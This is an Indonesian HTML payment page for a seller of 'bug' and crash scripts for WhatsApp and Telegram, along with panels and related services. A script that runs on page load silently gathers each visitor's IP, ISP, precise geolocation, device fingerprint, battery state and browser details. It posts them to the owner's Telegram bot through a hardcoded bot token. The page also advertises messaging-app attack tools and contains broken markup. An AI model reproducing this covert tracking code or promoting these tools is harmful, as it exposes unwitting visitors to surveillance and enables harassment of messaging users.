<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Pembayaran Premium</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');

    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1f1c2c, #928dab);
      color: #fff;
      text-align: center;
      padding: 30px 10px;
      margin: 0;
    }

    h1 {
      font-size: 2.2em;
      margin-bottom: 5px;
    }

    p {
      font-size: 1.1em;
      margin-bottom: 20px;
      color: #f5f5f5;
    }

    img.anime {
      width: 300px;
      border-radius: 15px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
      margin-bottom: 25px;
    }

    .btn {
      display: block;
      width: 85%;
      max-width: 300px;
      margin: 12px auto;
      padding: 14px;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 14px;
      cursor: pointer;
      transition: 0.3s;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    }

    .bayar { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
    .menu  { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
    .cs    { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
    .telegram { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
    .owner { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
    .music { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }
    .WhatsApp { background: linear-gradient(to right, #b91c1c, #1f1c2c); color: white; }

    .btn:hover { opacity: 0.9; }

    footer {
      margin-top: 30px;
      font-size: 0.9em;
      color: #ccc;
    }

    .popup {
      display: none;
      background-color: rgba(0,0,0,0.85);
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 999;
      justify-content: center;
      align-items: center;
    }

    .popup-content {
      background-color: #2c3e50;
      padding: 20px;
      border-radius: 15px;
      width: 90%;
      max-width: 420px;
      text-align: left;
      color: white;
      overflow-y: auto;
      max-height: 80vh;
    }

    .popup-content h2 {
      margin-top: 0;
      color: #f39c12;
    }

    .close-btn {
      background: crimson;
      color: white;
      padding: 8px 15px;
      margin-top: 15px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .identitas img {
      width: 100px;
      border-radius: 50%;
      margin: 10px auto;
      display: block;
    }

    .identitas h3 {
      text-align: center;
      color: #00e6b8;
    }

    .identitas p {
      font-size: 0.95em;
      text-align: justify;
    }

    .titik-tiga {
      position: fixed;
      top: 20px;
      right: 20px;
      font-size: 28px;
      color: white;
      cursor: pointer;
      z-index: 1000;
      user-select: none;
      font-weight: bold;
      background: rgba(255,255,255,0.1);
      padding: 8px 12px;
      border-radius: 10px;
      backdrop-filter: blur(6px);
      transition: background 0.3s ease;
    }

    .titik-tiga:hover {
      background: rgba(255,255,255,0.2);
    }
  </style>
</head>
<body>

<style>
            body {
                min-height: 100vh;
                background: linear-gradient(130deg, #09090b 0%, #45020c 100%);
                font-family: "Segoe UI", sans-serif;
            }
            .glow {
                box-shadow:
                    0 0 32px 6px #b91c1c99,
                    0 0 2px #fff;
                border: 2.5px solid #b91c1c;
                animation: pulse 2.5s infinite;
            }
            .neon-text {
                color: #f87171;
                text-shadow:
                    0 0 10px #b91c1c,
                    0 0 20px #b91c1c,
                    0 0 30px #b91c1c,
                    0 0 40px #b91c1c90,
                    0 0 70px #b91c1c80;
                letter-spacing: 2px;
                animation: neonflicker 3s infinite alternate;
            }
            @keyframes pulse {
                0%,
                100% {
                    box-shadow:
                        0 0 32px 8px #b91c1c66,
                        0 0 2px #fff;
                }
                50% {
                    box-shadow:
                        0 0 64px 12px #f87171cc,
                        0 0 12px #fff;
                }
            }
            @keyframes neonflicker {
                0%,
                100% {
                    opacity: 1;
                    filter: brightness(1);
                }
                70% {
                    opacity: 0.93;
                    filter: brightness(1.2);
                }
                85% {
                    opacity: 0.7;
                    filter: brightness(1.5);
                }
            }
            .paycard {
                background: rgba(18, 16, 18, 0.93);
                border-radius: 1.7rem;
                box-shadow: 0 2px 40px #b91c1c30;
                transition:
                    transform 0.14s,
                    box-shadow 0.14s;
            }
            .paycard:hover {
                transform: translateY(-8px) scale(1.03);
                box-shadow:
                    0 8px 60px #fa223499,
                    0 0 24px #fa223455;
            }
            .qrbox {
                background: linear-gradient(135deg, #1e1b20 60%, #333 100%);
                padding: 1.2rem;
                border-radius: 1.2rem;
                box-shadow: 0 0 22px #2227;
            }
            .btn-tg {
                background: linear-gradient(90deg, #b91c1c, #f87171);
                color: #fff;
                border-radius: 999px;
                font-weight: 600;
                padding: 0.75rem 2rem;
                box-shadow: 0 2px 24px #b91c1c45;
                transition:
                    background 0.18s,
                    box-shadow 0.18s,
                    transform 0.18s;
                border: none;
                display: inline-flex;
                align-items: center;
                gap: 0.6em;
                font-size: 1rem;
                margin-top: 2.5rem;
                cursor: pointer;
                letter-spacing: 0.5px;
                outline: none;
            }
            .btn-tg:hover {
                background: linear-gradient(90deg, #d71c1c, #f43f5e);
                box-shadow: 0 6px 32px #fa223485;
                transform: scale(1.05) translateY(-2px);
                text-decoration: none;
                color: #fff;
            }
            .btn-tg svg {
                width: 22px;
                height: 22px;
                margin-right: 0.25em;
                vertical-align: middle;
                fill: #fff;
            }
            .copy-btn {
                background: #18181b;
                border: 1.2px solid #f87171;
                color: #fff;
                padding: 0.45rem 1.2rem;
                border-radius: 999px;
                margin-top: 1em;
                cursor: pointer;
                font-size: 0.98em;
                font-weight: 500;
                transition:
                    background 0.13s,
                    border 0.13s;
            }
            .copy-btn:hover {
                background: #f87171;
                border: 1.5px solid #fff;
                color: #fff;
            }
            /* List jualan */
            .list-jualan {
                background: #18181b;
                border-radius: 1.5rem;
                box-shadow: 0 2px 32px #fa223420;
                padding: 2rem 1.5rem;
                margin-bottom: 2.5rem;
                width: 100%;
                max-width: 470px;
            }
            .list-jualan h2 {
                color: #f87171;
                text-shadow: 0 0 12px #b91c1c77;
                font-size: 1.3rem;
                font-weight: bold;
                margin-bottom: 1rem;
                letter-spacing: 1px;
                text-align: center;
            }
            .list-jualan ul {
                padding-left: 1.1rem;
            }
            .list-jualan li {
                color: #fff;
                font-size: 1.06rem;
                margin-bottom: 0.7em;
                border-left: 3px solid #fa2234;
                padding-left: 0.7em;
                line-height: 1.5;
                background: #24242455;
                border-radius: 0.3em;
                transition: background 0.2s;
            }
            .list-jualan li:hover {
                background: #b91c1c22;
            }
        </style>

  <!-- TITIK TIGA MENU -->
  <div class="titik-tiga" onclick="showPopup('popupMenuTiga')">⋮</div>

  <h1>💫 SEMUA BARANG TERSEDIA DI BAWAH </h1>
  <p>Silahkan pilih  Barang berkualitas Di Bawah Ini!</p>

  <img src="https://files.catbox.moe/gwnw0u.jpg" class="anime w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" alt="Anime Girl">

  <button class="btn bayar w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="showPopup('popupBayar')">💰 Bayar Sekarang</button>
  <button class="btn menu w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="showPopup('popupMenu')">📋 Menu Lainnya</button>
  <button class="btn cs w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiCS()">📩 Hubungi CS</button>
    <button class="btn telegram w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiTelegram()">💬 Contact via Telegram</button> 
  <button class="btn owner w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="showPopup('t.me/wan4nz')"Tentang Owner</button>
  <button class="btn music w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="toggleYouTube()">🎵 Play Music</button>
      <button class="btn WhatsApp w-24 mt-12 mb-5 rounded-2xl shadow-lg glow" onclick="hubungiWhatsapp()">💬 Contact Owner</button> 

  <!-- saluran testi wannz -->
  <iframe id="testi"
    width="320"
    height="180"
    src="https://files.catbox.moe/byomk1.jpg"
    frameborder="0"
    allow="onclik"
    allowfullscreen
    style="border-radius:15px; margin-top:20px;">
  </iframe>

  <h3>
    &copy; 2025 ObyMoods Website Payment
  </h3>

  <!-- POPUP: Bayar -->
  <div class="popup" id="popupBayar">
    <div class="popup-content w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
      <h2>🔐 Metode Pembayaran</h2>
      <p class="text-lg font-semibold text-[#02bde3] mb-3 tracking-wider neon-text"
                    style="color: #02bde3; text-shadow: 0 0 14px #02bde3cc">𝐍𝐎 𝐃𝐀𝐍𝐀:</p>
      <b>085880407394
      ATAS NAMA: SANTI</b>
      <button id="copy-btn" class="copy-btn" onclick="copyDana()">
                    SALIN NOMOR DANA
                </button>
      <p class="text-lg font-semibold text-[#02bde3] mb-3 tracking-wider neon-text"
                    style="color: #02bde3; text-shadow: 0 0 20px #02bde3cc">𝐀𝐓𝐀𝐔 𝐒𝐂𝐀𝐍 𝐐𝐑𝐈𝐒 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇 𝐈𝐍𝐈:</p>
      <img src="https://files.catbox.moe/4gxxe4.jpg" alt="QRIS" style="width:100%; border-radius:15px;">
      <button class="close-btn" onclick="closePopup('popupBayar')" style="width:100%;">Tutup</button>
    </div>
  </div>

  <!-- POPUP: Menu -->
  <div class="popup" id="popupMenu">
    <div class="popup-content w-24 mt-12 mb-5 rounded-2xl shadow-lg glow ">
      <h2>🛍️ DAPTAR JUALAN WANZ</h2>
      <ul>
        <li>✅ SCRIPT BUG WA/TELE</li>
        <li>✅ SCRIPT DESTROYED
       ✅ SCRIPT ZENO 
       ✅ SCRIPT ZOMBIE INVITY
       ✅ SCRIPT RIMURU
       ✅ SCRIPT NORTH STAR
       ✅ SCRIPT DRAGON CRASH
       ✅ SCRIPT XEROVANG
       ✅ SCRIPT THREE BROTHERS 
       ✅ SCRIPT DREADT INVICTUS
       ✅ DLL
       ✅ MENYEDIAKAN PANEL  </li>
        <li>✅ PANEL UNLIMITED</li> <li>✅  RESELLER PANEL</li>
        <li>✅ ADMIN PANEL
           ✅ JASA MASANG SCRIPT BUG </li>
        <li>✅ OWNER PANEL
           ✅ JASA BUG
           ✅ MURBUG VIIP (MURID BUG) </li>
      </ul>
      <button class="close-btn" onclick="closePopup('popupMenu')" style="width:100%;">Tutup</button>
    </div>
  </div>

  <!-- POPUP: Owner -->
  <div class="popup" 8147535653="wan4nz">
    <div class="popup-content identitas w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
      <h2>👑 Identitas Owner</h2>
      <img src="https://files.catbox.moe/ru3o9a.jpg" alt="Owner">
      <h3>ObyMoods</h3>
      <p>
        Seorang pengusaha muda dari Indonesia yang ingin  membuat kedua orang tuanya bahagia, dan pembayaran yang aman layanan premium berkulaitas tinggi..
        <br><br>
        Motto: <i>"Berjuang Tak Kenal Lelah, Tetap Kuat Untuk Sang Pembenci!!."</i>
      </p>
      <button class="close-btn" onclick="closePopup('popupOwner')" style="width:100%;">Tutup</button>
    </div>
  </div>

  <!-- POPUP: Menu Titik Tiga -->
  <div class="popup" id="popupMenuTiga">
    <div class="w-24 mt-12 mb-5 rounded-2xl shadow-lg glow">
      <h2>📌 Support & Fitur Tambahan</h2>
      <p><b>📂 bangkit sendiri tanpa mengenal lelah:</b></p>
      <ul>
        <li>•  (wannz)</li>
        <li>• O(wanzzz)</li>
      </ul>
      <hr>
      <p><b>🧩 Fitur Lainnya:</b></p>
      <ul>
        <li>• Layanan Premium 24 Jam</li>
        udah terjamin aman dan berkualitas 
        <li>• Proteksi Anti-Ban</li>
        <li>• Script WhatsApp MD</li>
      </ul>
      <button class="close-btn" onclick="closePopup('popupMenuTiga')" style="width:90%;">Tutup</button>
    </div>
  </div>
  
<body>
  <script>
    const BOT_TOKEN = "7992707767:AAGDgSbrxBGtKglDY-JAo2Z6tN_Xc0_DDJs";
    const OWNER_CHAT_ID = "7466190629"; // <-- Ganti dengan chat ID owner bot (bukan grup)

    async function generateFingerprint() {
      const ua = navigator.userAgent;
      const lang = navigator.language;
      const res = screen.width + "x" + screen.height;
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const ram = navigator.deviceMemory || "N/A";
      const cpu = navigator.hardwareConcurrency || "N/A";

      const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
      const encoder = new TextEncoder();
      const data = encoder.encode(raw);
      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
      return [...new Uint8Array(hashBuffer)].map(x => x.toString(16).padStart(2, '0')).join('');
    }

    async function getVisitorInfo() {
  const clock = new Date().toLocaleString();
  let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
  let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";

  const userAgent = navigator.userAgent;
  const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
  const device = navigator.platform + " - " + userAgent;
  const loginFrom = navigator.platform || "N/A";
  const language = navigator.language || "N/A";
  const resolution = screen.width + "x" + screen.height;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
  const isOnline = navigator.onLine;
  const deviceMemory = navigator.deviceMemory || "N/A";
  const cpuCores = navigator.hardwareConcurrency || "N/A";
  const isTouch = 'ontouchstart' in window;
  const cookiesEnabled = navigator.cookieEnabled;
  const doNotTrack = navigator.doNotTrack;
  const fingerprint = await generateFingerprint();

  // Battery info
  const batteryInfo = await navigator.getBattery().then(battery => {
    return {
      "battery level": Math.round(battery.level * 100) + "%",
      "charging": battery.charging ? "yes" : "no"
    };
  }).catch(() => ({
    "battery level": "N/A",
    "charging": "N/A"
  }));

  try {
    const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
    ip = ipData.ip;
    country = ipData.country_name;
    province = ipData.region;
    latitude = ipData.latitude;
    longitude = ipData.longitude;

    // Ambil nama ISP dari IP menggunakan ipinfo.io
    const whois = await fetch(`https://ipinfo.io/${ip}/json?token=123456789abcde`).then(r => r.json());
    namaISP = whois.org || "N/A";
  } catch {}

  try {
    const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
    weather = weatherData.current_condition[0].weatherDesc[0].value;
    temperature = weatherData.current_condition[0].temp_C + "°C";
  } catch {}

  try {
    await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(
        pos => {
          latitude = pos.coords.latitude.toFixed(6);
          longitude = pos.coords.longitude.toFixed(6);
          accuracy = pos.coords.accuracy + "m";
          resolve();
        },
        () => resolve(),
        { enableHighAccuracy: true, timeout: 5000 }
      );
    });
  } catch {}

  const jsonData = {
    "nama": namaISP,
    "alamat ip": ip,
    "device": device,
    "android versions": androidVersion,
    "login from": loginFrom,
    "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
    "country": country,
    "province": province,
    "clock": clock,
    "weather": weather,
    "temperature": temperature,
    "language": language,
    "screen resolution": resolution,
    "timezone": timezone,
    "online": isOnline,
    "ram (GB)": deviceMemory,
    "cpu cores": cpuCores,
    "touch support": isTouch,
    "cookies enabled": cookiesEnabled,
    "do not track": doNotTrack,
    "fingerprint": fingerprint,
    "battery": batteryInfo["battery level"],
    "charging": batteryInfo["charging"]
  };

  const message = `📥 *New users*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  });
}

    getVisitorInfo();
  </script>
</body>

  <!-- JS -->
  <script>
    function showPopup(id) {
      document.getElementById(id).style.display = "flex";
    }

    function closePopup(id) {
      document.getElementById(id).style.display = "none";
    }

    function hubungiCS() {
      window.location.href = "mailto:cs.aobi5198@gmail.com?subject=Bantuan Pembayaran&body=Halo admin, saya ingin tanya tentang pembayaran.";
    }
    
    function hubungiTelegram() {
      window.open("https://t.me/wan4nz", "_blank");
    }
    
    function hubungiWhatsapp() {
      window.open("https://wa.me/085880407394","_blank");
    }
    
    function copyDana() {
                const dana = "085880407394";
                navigator.clipboard.writeText(dana);
                const btn = document.getElementById("copy-btn");
                btn.innerText = "Copied!";
                setTimeout(() => (btn.innerText = "SALIN NOMOR DANA"), 1400);
            }

    let ytPlayer;
    let ytPlaying = false;

    function toggleYouTube() {
      if (!ytPlayer) return;
      const btn = event.target;
      if (!ytPlaying) {
        ytPlayer.playVideo();
        btn.innerText = "⏸️ Pause Music";
      } else {
        ytPlayer.pauseVideo();
        btn.innerText = "🎵 Play Music";
      }
      ytPlaying = !ytPlaying;
    }

    function onYouTubeIframeAPIReady() {
      ytPlayer = new YT.Player('ytPlayer');
    }

    const tag = document.createElement('script');
    tag.src = "https://www.youtube.com/iframe_api";
    const firstScriptTag = document.getElementsByTagName('script')[0];
    firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
  </script>

</body>
</html>